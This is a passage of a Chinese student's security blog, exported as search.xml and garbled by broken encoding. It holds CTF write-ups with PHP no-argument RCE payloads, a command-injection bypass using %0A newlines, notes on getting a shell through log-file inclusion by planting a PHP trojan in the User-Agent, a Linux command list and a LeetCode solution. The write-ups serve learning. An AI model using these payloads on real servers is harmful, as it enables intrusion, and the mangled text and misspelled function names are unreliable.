ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡</code></pre><p>trimï¼ˆï¼‰</p><pre><code>å»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–å…¶å®ƒå­—ç¬¦ï¼‰</code></pre><p>file_get_contents()</p><pre><code>æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­è¯­æ³•ï¼šfile_get_contents(path,include_path,context,start,max_length)path,å¿…éœ€ï¼Œè§„å®šè¦è¯»æ–‡ä»¶çš„è·¯å¾„</code></pre><p>flagå¹¶ä¸æ˜¯æ–‡ä»¶åœ°è·¯å¾„ï¼Œæ‰€ä»¥contentçš„å€¼ä¸ºç©ºï¼Œæ‰€ä»¥è®©liwuçš„å€¼ä¸contentçš„å€¼éƒ½ä¸ºç©ºå³æ„é€ ï¼Ÿliwu=&amp;flag=æˆ–è€…æ„é€ ï¼Ÿliwu=<br><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§å‘½ä»¤æ±‡æ€»</title>
      <link href="/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/"/>
      <url>/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>é‡åˆ°åéšæ—¶è¡¥å……</p><span id="more"></span><p> 1.cat<br><br>ã€€ã€€ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºã€‚å½“æ–‡ä»¶è¿‡å¤§æ—¶ï¼Œä½¿ç”¨catæŸ¥çœ‹ä¸æ–¹ä¾¿ã€‚<br><br>ã€€ã€€è¯­æ³•ï¼šcat -n filename.txt ï¼ˆ-nï¼šæ˜¾ç¤ºæ—¶ï¼Œè¿è¡Œå·ä¸€èµ·è¾“å‡ºï¼‰v<br>2.tac<br><br>ã€€ã€€ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºã€‚<br><br>ã€€ã€€è¯­æ³•ï¼štac filename.txt<br><br>3.more<br><br>ã€€ã€€æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œé€€å‡ºæŸ¥çœ‹é¡µé¢ï¼Œå¯æŒ‰â€œqâ€é”®ã€‚<br>ã€€ã€€å¦å¤–ï¼Œmoreå¯ä»¥é…åˆç®¡é“ç¬¦â€œ|â€ï¼ˆpipeï¼‰ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼šls -al | more<br>ã€€ã€€è¯­æ³•ï¼šmore filename.txt<br><br>4.less<br><br>ã€€ã€€å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥ä½¿ç”¨ã€pageupã€‘å’Œã€pagedownã€‘é”®å‰åç¿»é¡µã€‚<br><br>ã€€ã€€è¯­æ³•ï¼šless filename.txt<br><br>ã€€ã€€lessè¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥åœ¨æ–‡ä»¶ä¸­è¿›è¡Œæœç´¢å­—ç¬¦ä¸²ã€‚<br>5.head<br><br>ã€€ã€€åªæ˜¾ç¤ºæ–‡ä»¶çš„å‰å‡ è¡Œã€‚<br><br>ã€€ã€€è¯­æ³•ï¼šhead filename.txt æ˜¾ç¤ºæ–‡ä»¶çš„å‰10è¡Œ<br><br>ã€€ã€€head -n 3 filename.txt æ˜¾ç¤ºå‰3è¡Œ<br><br>ã€€ã€€head -3 filename.txt æ˜¾ç¤ºå‰3è¡Œ<br><br>6.tail<br><br>ã€€ã€€åªæ˜¾ç¤ºæ–‡ä»¶çš„åå‡ è¡Œ<br>ã€‚<br>ã€€ã€€è¯­æ³•ï¼šåŒhead<br><br>7.nl<br><br>ã€€ã€€nlçš„åŠŸèƒ½å’Œcat -nä¸€æ ·ï¼Œä»ç¬¬ä¸€è¡Œå¼€å§‹è¾“å‡ºå…¨éƒ¨å†…å®¹ï¼Œå¹¶ä¸”æ˜¾ç¤ºè¡Œå·ã€‚<br><br>ã€€ã€€è¯­æ³•ï¼šnl filename.txt<br><br>8.tailf<br><br>ã€€ã€€ç±»ä¼¼äºtail -f filename ç›‘è§†filenameæ–‡ä»¶çš„å°¾éƒ¨å†…å®¹ï¼ˆé»˜è®¤10è¡Œï¼Œç›¸å½“äºå¢åŠ å‚æ•° -n 10ï¼‰ï¼Œåˆ·æ–°æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚<br><br>ã€€ã€€tail -f å’Œ tailf çš„åŒºåˆ«ï¼š<br>   tailf æ€»æ˜¯ä»æ–‡ä»¶å¼€å¤´ä¸€ç‚¹ä¸€ç‚¹çš„è¯»ï¼Œ è€Œtail -f åˆ™æ˜¯ä»æ–‡ä»¶å°¾éƒ¨å¼€å§‹è¯»ï¼›<br><br>   tailf checkæ–‡ä»¶å¢é•¿æ—¶ï¼Œä½¿ç”¨çš„æ˜¯æ–‡ä»¶åï¼Œ ç”¨statç³»ç»Ÿè°ƒç”¨ï¼›è€Œtail -f åˆ™ä½¿ç”¨çš„æ˜¯æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼›<br><br>   æ³¨ï¼štailf ä¹Ÿå¯ä»¥åšåˆ°ç±»ä¼¼è·Ÿè¸ªæ–‡ä»¶åçš„æ•ˆæœï¼Œä½†æ˜¯tailæ€»æ˜¯ä½¿ç”¨fstatç³»ç»Ÿè°ƒç”¨ï¼Œè€Œä¸æ˜¯statç³»ç»Ÿè°ƒç”¨ã€‚ç»“æœå°±æ˜¯ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œå½“tailçš„æ–‡ä»¶è¢«å·å·åˆ é™¤æ—¶ï¼Œtailæ˜¯ä¸çŸ¥é“çš„ï¼Œè€Œtailfæ˜¯çŸ¥é“çš„ã€‚<br>9.sort<br><br>  sortå¯é’ˆå¯¹æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œä»¥è¡Œä¸ºå•ä½æ¥æ’åºã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rce</title>
      <link href="/2020/11/25/rce/"/>
      <url>/2020/11/25/rce/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>basic rce</p><span id="more"></span><p>é¦–å…ˆæ‹¿åˆ°é¢˜ï¼Œå°±ç›´æ¥æƒ³åˆ°æ˜¯ä¸æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åè¿èšå‰‘ï¼Œè¿ä¸ä¸Šï¼Œå¾¡å‰‘æ‰«æç›®å½•ï¼Œè¡¥å…¨index.php,è¿˜æ˜¯è¿ä¸ä¸Šâ€¦</p><p>æœ€ä¸‹é¢æœ‰ä¸ªç®€å•çš„æ–¹æ³•æ²¡æƒ³åˆ°å½“æ—¶<br></p><p>ç„¶åå°±åœ¨ç½‘ä¸Šæœå…³äºrceçš„èµ„æ–™ï¼Œçœ‹è§ä¸€ä¸ªå…³äºæ— å‚æ•°è¯»æ–‡ä»¶å’ŒRCEæ€»ç»“çš„ä»‹ç»è·Ÿé¢˜ç›®å¥½åƒï¼Œæˆ‘è·Ÿç€é‚£ä¸ªæ“ä½œï¼Œå¾—å‡ºäº†flagã€‚<br><img src="1.png" alt="1"><br><img src="2.png" alt="2"><br>è¿™é‡ŒæŠŠåˆ†äº«ä¸‹é€šè¿‡è¿™é“é¢˜æ‰€å­¦åˆ°çš„çŸ¥è¯†<br>å…ˆè¯´ä»€ä¹ˆæ˜¯æ— å‚æ•°ï¼Ÿ<br>å°±æ˜¯åªèƒ½ä½¿ç”¨å‡½æ•°ï¼Œä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œä¸”å‡½æ•°èƒ½æ¥å—å…¶æ‹¬å·æ‰€å¸¦å‡½æ•°çš„è¿”å›å€¼<br>ã€‚<br>è¿™ä¸ªé¢˜ç›®å°±çŸ­çŸ­çš„å‡ è¡Œä»£ç ï¼Œä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆï¼Œæ‰€ä»¥å°±æƒ³ç€å»çœ‹çœ‹è¿™ä¸ªé¡µé¢æœ‰æ²¡æœ‰ä»€ä¹ˆéšè—çš„ç›®å½•ã€‚<br>æ³•ä¸€ã€‚æˆ‘ä»¬å¯ä»¥ç”¨print_r(scandir(â€˜.â€™));æ¥æŸ¥çœ‹æ‰€æœ‰çš„æ–‡ä»¶åå’Œç›®å½•ã€‚<br>ä½†æ˜¯è¾“å…¥åæ²¡æœ‰å›å“ï¼Œå› ä¸ºæ˜¯æ— å‚æ•°å˜›ï¼Œæ‰€ä»¥æƒ³åŠæ³•å»æ„é€ è¿™ä¸ªâ€™.â€™<br>localeconv()<br>è¿”å›ä¸€ç»„åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œæ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯â€™.â€™ï¼Œä½†è¦æˆ‘ä»¬æ€ä¹ˆå–åˆ°è¿™ä¸ªâ€™.â€™å‘¢ï¼Ÿ<br>currentï¼ˆï¼‰<br>è¿”å›æ•°ç»„å•å…ƒé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼<br>æ‰€ä»¥æ„é€ payload<br>ï¼Ÿa=print_r(scandir(current(localeconv())));<br><img src="1.png" alt="1"><br>æˆåŠŸæŸ¥çœ‹åˆ°æ‰€æœ‰çš„ç›®å½•<br>æ³•äºŒ<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨print_r(scandir(â€œç»å¯¹è·¯å¾„â€));<br>ç»å¯¹è·¯å¾„ï¼šç»å¯¹è·¯å¾„ï¼Œå°±æ˜¯ä»ç›˜ç¬¦å¼€å§‹çš„è·¯å¾„ï¼Œä¾‹å¦‚ï¼šâ€œc:\windows\system32\mfc42.dllâ€<br>è·å¾—ç»å¯¹è·¯å¾„çš„å‡½æ•°æœ‰getcwd()<br>æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æ„é€ <br>ï¼Ÿa=print_r(scandir(getcew()));<br>æˆ‘ä»¬æ‰€æœ‰çš„ç›®å½•éƒ½æ˜¯æ•°ç»„çš„å€¼ï¼Œæˆ‘ä»¬è¦å¾—åˆ°æ¯ä¸ªæ–‡ä»¶å¯¹åº”çš„æ•°ç»„<br>ä»ç›®å½•åå•ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œflagå¯¹åº”çš„æ•°ç»„æ˜¯åœ¨å€’æ•°ç¬¬äºŒä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å»ä½¿ç”¨å‡½æ•°å»è¯»å–è¿™ä¸ªå€’æ•°ç¬¬äºŒä½çš„æ•°ç»„<br>äº†è§£å‡ ä¸ªå‡½æ•°<br>show_source()å¯¹æ–‡ä»¶è¿›è¡Œé«˜äº®æ˜¾ç¤ºï¼Œ<br>nextï¼ˆï¼‰æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€ä½<br>array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚<br>æ‰€ä»¥æ„é€ payload<br>?a=show_source(next(array_reverse(scandir(getcew))));<br>æ‹¿åˆ°flag<br><img src="2.png" alt="2"><br>ps<br>å¦‚æœæƒ³å¾—åˆ°å€’æ•°ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨å‡½æ•°end()<br>æ„é€ payloadï¼Ÿa=show_source(end(scandir(getcewï¼ˆï¼‰)));<br>å¦‚æœä¸æ˜¯å€’æ•°ç¬¬ä¸€ä¸ªæˆ–è€…ç¬¬äºŒä¸ªï¼Œå¯ä»¥å°è¯•éšæœºå‡½æ•°<br>array_rand()éšæœºè¿”å›ä¸€ä¸ªæ•°ç»„<br>array_filp()äº¤æ¢æ•°ç»„åœ°é”®å’Œå€¼<br>show_source(array_rand(array_filp(scandir(getcew()))));</p><p>çªç„¶å­¦åˆ°ä¸€ä¸ªç®€å•çš„æ–¹æ³•</p><p>ç”¨ï¼Ÿa=systemï¼ˆâ€lsâ€ï¼‰;å»çœ‹ç›®å½•ï¼Œå‘ç°æœ‰ä¸ªf111a9.phpï¼Œç„¶åå°±å¯ä»¥ç”¨catï¼Œtacï¼Œsortï¼Œå»æŸ¥çœ‹ï¼Œcatæ— å›å“ï¼Œå…¶ä»–ä¸¤ä¸ªå¯ä»¥ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>exec1,php</title>
      <link href="/2020/11/21/exec1-php/"/>
      <url>/2020/11/21/exec1-php/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æ— å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><span id="more"></span><p>æ‹¿åˆ°è¿™é“é¢˜ï¼Œæ‰“å¼€æ˜¯ç©ºç™½ï¼Œæœ¬å°ç™½è¡¨ç¤ºå¾ˆæ‡µé€¼ï¼Œçœ‹äº†ä¸€çœ¼å¤§ä½¬å†™çš„wpï¼Œè¯´æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¾ˆå¥‡æ€ªï¼Œæ€ä¹ˆçœ‹å‡ºæ¥å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´äº†ï¼Œå¤§ä½¬éƒ½è¿™ä¹ˆå‰å®³ï¼Ÿå…ˆå»ç™¾åº¦äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¤§æ¦‚äº†è§£äº†ä¸‹ï¼Œçœ‹åˆ°äº†phpæœ‰ä¸ªexec()å‡½æ•°ï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬çš„é¢˜ç›®å˜›ï¼ŒåŸæ¥æ˜¯è¿™çœ‹å‡ºçš„ã€‚æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œå…ˆè¾“å…¥/exec1.phpï¼Œå•Šï¼Œå®ƒç»ˆäºä¸æ˜¯ç©ºç™½äº†ã€‚<br>ï¼<a href="1.png">1</a><br>æ ¹æ®æç¤ºPingäº†ä¸€ä¸‹ï¼Œï¼Ÿip=127.0.0.1ï¼ˆæœ¬åœ°å›ç¯ipï¼Œä»–ä»£è¡¨è®¾å¤‡çš„æœ¬åœ°è™šæ‹Ÿæ¥å£ï¼Œæ‰€ä»¥è¢«é»˜è®¤çœ‹ä½œæ˜¯æ°¸è¿œä¸ä¼šå®•æ‰çš„æ¥å£ï¼‰<br>ï¼<a href="2.png">2</a><br>ç„¶åå°±æ‰§è¡Œä¸‹ä¸€ä¸ªæŒ‡ä»¤ï¼Œæ‹¼æ¥ç¬¦å¥½åƒéƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨æ¢è¡Œç¬¦%0Aæ‰§è¡Œlså‘½ä»¤ï¼Œå‘ç°æœ‰ä¸ªexec1.phpçš„æ–‡ä»¶ï¼Œç›´æ¥catæ— å›å“ï¼Œå»æŸ¥çœ‹æ–‡ä»¶çš„ç›®å½•ï¼Œè¿™é‡Œæœ‰getäº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ã€‚<br>/ï¼šä»£è¡¨ç€æ ¹ç›®å½•ï¼Œæ˜¯æ ‘å½¢ç»“æ„çš„æœ€ä¸Šå±‚<br>.ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç”¨./è¡¨ç¤ºï¼›<br>. .ï¼šè¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç”¨. ./è¡¨ç¤ºï¼›<br>ï¼<a href="3.png">3</a><br>ç”¨äº†ä¸‰æ¬¡æ‰å‡ºæ¥ï¼Œè¿™é¢˜ç›®ä¹Ÿæ˜¯ï¼Œå®³ã€‚<br>ç„¶åcatå¾—flag<br>ï¼<a href="4.png">4</a><br>åšé¢˜ä¸æ˜“å•Š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åšé¢˜ä¸­é‡åˆ°çš„æ¼æ´ç§¯ç´¯</title>
      <link href="/2020/11/21/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/"/>
      <url>/2020/11/21/%E5%81%9A%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ç”¨è¿™ä¸ªæ¥è®°å½•åšé¢˜æ—¶æ‰€é‡åˆ°çš„æ¼æ´å§ã€‚</p><span id="more"></span><p><em>å‘½ä»¤æ‰§è¡Œæ¼æ´</em></p><br>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æŒ‡æœåŠ¡å™¨æ²¡æœ‰å¯¹æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œè¿‡æ»¤ï¼Œç”¨æˆ·å¯ä»¥éšæ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œæ¼æ´å±äºé«˜å±æ¼æ´ä¹‹ä¸€ã€‚<br>å¦‚phpçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ä¸»è¦æ˜¯åŸºäºä¸€äº›å‡½æ•°çš„å‚æ•°è¿‡æ»¤ä¸è¶³å¯¼è‡´çš„ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰systemï¼Œexecï¼Œshell-execï¼Œpassthruï¼Œpcntl-execlï¼Œpopenï¼Œproc-openç­‰ã€‚<br>æ¼æ´çš„åŸç†<br>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œ & ã€&& ã€| ã€ || éƒ½å¯ä»¥ä½œä¸ºå‘½ä»¤è¿æ¥ç¬¦ä½¿ç”¨ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤<br><em>æ³¨è§£</em><br>A&&B   å…ˆæ‰§è¡ŒAï¼Œæ‰§è¡ŒæˆåŠŸåæ‰§è¡ŒBï¼Œå¦åˆ™ä¸æ‰§è¡ŒB<br>A|B    åªæ‰§è¡ŒB<br>A&B    å…ˆæ‰§è¡ŒAï¼Œä¸ç®¡æ˜¯å¦æˆåŠŸï¼Œéƒ½ä¼šæ‰§è¡ŒB<br>A;B    å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB<br>A&B    ç®€å•æ‹¼æ¥ï¼ŒA Bä¹‹é—´æ— åˆ¶çº¦å…³ç³»<br>ä½†æ˜¯æœ‰æ—¶åšé¢˜ä¼šå‡ºç°è¿‡æ»¤ç°è±¡ï¼Œè¦ä¸€ä¸ªä¸€ä¸ªè¯•è¯•ï¼Œç„¶å%0Aä¹Ÿå¯ä»¥å®ç°æ‹¼æ¥<br><p><em>åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</em></p><br><h1>åŒ…å«æ—¥å¿—æ–‡ä»¶æ¼æ´åˆ©ç”¨æ¦‚è¿°</h1>å½“æˆ‘ä»¬æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰url_allow_includeåŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘åŒ…å«æœåŠ¡å™¨çš„æ—¥å¿—æ–‡ä»¶ã€‚åˆ©ç”¨æ€è·¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå½“æˆ‘ä»¬è®¿é—®ç½‘ç«™æ—¶ï¼ŒæœåŠ¡å™¨çš„æ—¥å¿—éƒ½ä¼šè®°å½•æˆ‘ä»¬çš„è¡Œä¸ºï¼Œå½“æˆ‘ä»¬è®¿é—®é“¾æ¥ä¸­åŒ…å«phpä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œä¹Ÿä¼šè¢«è®°å½•åˆ°æ—¥å¿—ä¸­å»ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¦‚æœçŸ¥é“æœåŠ¡å™¨çš„æ—¥å¿—æ–‡èŒï¼Œæˆ‘ä»¬å¯ä»¥å»åŒ…å«è¿™ä¸ªæ–‡ä»¶ä»è€Œæ‹¿åˆ°shellï¼ˆshellæ˜¯ä¸€ä¸ªç”¨cè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨linuxçš„æ¡¥æ¢ã€‚è¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªå§ä¹°ä½ è®¿é—®æ“ä½œç³»ç»Ÿçš„ç³»ç»Ÿå†…æ ¸æœåŠ¡ï¼‰ã€‚å…¶å®æ•´ä¸ª"åŒ…å«æ—¥å¿—æ–‡ä»¶æ¼æ´åˆ©ç”¨"æœ€å…³é”®çš„å°±æ˜¯æ‰¾åˆ°æ—¥å¿—å­˜æ”¾çš„"ç‰©ç†è·¯å¾„",åªè¦æ‰¾åˆ°æ—¥å¿—çš„ç‰©ç†å­˜æ”¾è·¯å¾„ï¼Œä¸€åˆ‡å°±å¯ä»¥æŒ‰éƒ¨å°±ç­çš„å®Œæˆåˆ©ç”¨äº†ã€‚<h1>æ¼æ´åˆ©ç”¨æ¡ä»¶</h1><ul><li>æ—¥å¿—çš„ç‰©ç†å­˜æ”¾è·¯å¾„</li><li>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</li></ul><h1>è·å¾—æ—¥å¿—å­˜æ”¾è·¯å¾„</h1><ol><li>apache+linuxæ—¥å¿—é»˜è®¤Â·å­˜æ”¾è·¯å¾„<br>/etc/httpd/logs/access_log<br>/var/log/httpd/access_log</li><li>apache+win2003é»˜è®¤è·¯å¾„<br>D:\xampp\apache\logs\access.log<br>Dï¼š\xampp\apache\logs\eror.log<br><li>iis6.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶<br>Cï¼š\WINDOWS\system32\Logfiles<li>iis6.0+win2003é»˜è®¤æ–‡ä»¶<br>  %SystemDrive%\inetpub\logs\LogFiles<br><li>nginxæ—¥å¿—æ–‡ä»¶<br>æ—¥å¿—æ–‡ä»¶åœ¨ç”¨æˆ·å®‰è£…ç›®å½•logsç›®å½•ä¸‹<br>è‹¥å®‰è£…è·¯å¾„ä¸º/usr/local/nginx<br>åˆ™æ—¥å¿—ç›®å½•å°±æ˜¯åœ¨/usr/local/nginx/logsé‡Œ<br><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨user-agenté‚£é‡Œæ·»åŠ æˆ‘ä»¬çš„æœ¨é©¬ï¼Œç„¶åé“¾æ¥å¾—åˆ°shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŠ›æ‰£ä¸¤æ•°ä¹‹å’Œ</title>
      <link href="/2020/11/20/%E5%8A%9B%E6%89%A3%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2020/11/20/%E5%8A%9B%E6%89%A3%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>åŠ›æ‰£ä¸¤æ•°ä¹‹å’Œçš„æš´åŠ›è§£æ³•ï¼Œï¼Œï¼Œå°ç™½æš‚æ—¶åªä¼šæš´åŠ›è§£æ³•</p><span id="more"></span><p>ç¬¬ä¸€æ¬¡å†™åšå®¢ï¼Œå†…å¿ƒæœ‰ç‚¹å°æ¿€åŠ¨ï¼Œæ¯•ç«Ÿæ‰‹æ­åšå®¢åºŸäº†æˆ‘å¥½é•¿æ—¶é—´ã€‚<br>è¿™é“é¢˜ï¼Œæ¯•ç«Ÿæˆ‘ç°æœ‰çš„çŸ¥è¯†æœ‰é™ï¼Œå®³ï¼Œè¿˜æ˜¯æ…¢æ…¢å­¦å§ï¼Œç°åœ¨è¿˜åªä¼šæœ€ç®€å•çš„æ–¹æ³•ã€‚<br>classæ˜¯ç±»ï¼Œsolutionæ˜¯ç±»åï¼Œåˆ‡è®°{}ï¼›è¿™ä¸ªåˆ†å·ä¸èƒ½å¿˜ã€‚è¿™é“é¢˜ç”¨äº†éå†æ•°ç»„çš„æ–¹æ³•ï¼Œiçš„ä¸‹æ ‡æ•°å¼€å§‹æ˜¯0ï¼Œç„¶ååŠ ä¸€ä¸èƒ½è¶…è¿‡æ•°ç»„çš„é•¿åº¦åœ¨å‡1ï¼Œç„¶åi++æˆ‘çš„ç†è§£æ˜¯ï¼Œè¿™ä¸æ˜¯ä»0å¼€å§‹çš„ï¼Œå½“ç„¶è¦å‡å»ä¸€å•Šï¼Œç„¶åj=i+1ï¼Œé•¿åº¦ä¸èƒ½è¶…è¿‡æ•°ç»„j++æœ‰ä¸€ç‚¹æˆ‘ä¸å¤§æ˜ç™½ä¸ºå•¥å­jä¸èƒ½ä»1å¼€å§‹ï¼Œä¸éƒ½æ˜¯éå†ä¸€éå—ã€‚å¯èƒ½æ˜¯æˆ‘çš„çŸ¥è¯†æœ‰é™ï¼Œæˆ‘è¿˜æ˜¯ä¸‹å»å†ç ”ç©¶ç ”ç©¶ã€‚<br>class Solution {<br>public:<br>    vector<int> twoSum(vector<int>&amp; nums, int target) {<br>        int i,j;<br>        for(i = 0;i&lt;nums.size() - 1;i++)<br>        {<br>            for (j = i+1;j&lt;nums.size(); j++)<br>            {<br>                if (nums[i] + nums[j] == target)<br>                {<br>                    return{i,j};<br>                }<br>            }<br>        }<br>         return{i,j};<br>    }<br>};</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
